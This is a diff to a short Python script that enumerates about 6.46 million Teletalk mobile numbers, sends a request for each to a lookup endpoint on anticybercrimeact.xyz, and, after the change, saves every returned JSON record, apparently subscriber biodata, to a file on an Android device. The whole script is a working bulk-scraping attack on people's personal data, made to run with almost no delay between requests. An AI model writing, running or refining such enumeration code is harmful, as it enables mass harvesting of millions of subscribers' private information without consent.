@@ -1,13 +1,14 @@
 import requests
-import os
+import json
 import time
+import os
 
 # Define the base URL and phone number prefix
 base_url = "https://anticybercrimeact.xyz/api/BIO/teletalk.php?phone="
 prefix = "015"
 
-# Initialize a counter for successful responses
-success_count = 0
+# Initialize an empty list to store responses
+all_responses = []
 
 # Loop through all possible Teletalk numbers (example range for 6.46 million users)
 for i in range(12345678, 12345678 + 6460000):
@@ -17,23 +18,28 @@ for i in range(12345678, 12345678 + 6460000):
     # Send the request and get the response
     try:
         response = requests.get(url)
-        if response.status_code == 200:  # Check for successful response
-            success_count += 1
-            print(f"Success {success_count}")
+        response_data = response.json()  # Parse the JSON response
+        
+        # Append the response to the list
+        all_responses.append({"phone_number": phone_number, "data": response_data})
+        
+        # Print success message with count only
+        print(f"Success {i - 12345678 + 1}")
         
     except Exception as e:
         print(f"Error querying {phone_number}: {e}")
     
     # Optional: Delay to prevent server overload
-    time.sleep(0.00001)  # Adjust as needed
+    time.sleep(0.0001)  # Adjust as needed
 
-# Define the storage path
-storage_path = "/storage/emulated/0/teletalk_data.txt"  # Ensure the path is correct
+# Define the storage path (Update this path if needed)
+storage_path = "/storage/emulated/0/teletalk_data.json"  # Common Android path
 
-# Attempt to save the success count to the specified storage path
-try:
-    with open(storage_path, "w") as file:
-        file.write(f"Total successful queries: {success_count}\n")
-    print(f"All data saved to {storage_path}")
-except Exception as e:
-    print(f"Failed to save data: {e}")
+# Ensure the directory exists
+os.makedirs(os.path.dirname(storage_path), exist_ok=True)
+
+# Save all responses to a JSON file in storage path
+with open(storage_path, "w") as json_file:
+    json.dump(all_responses, json_file, indent=4)
+
+print(f"All data saved to {storage_path}")
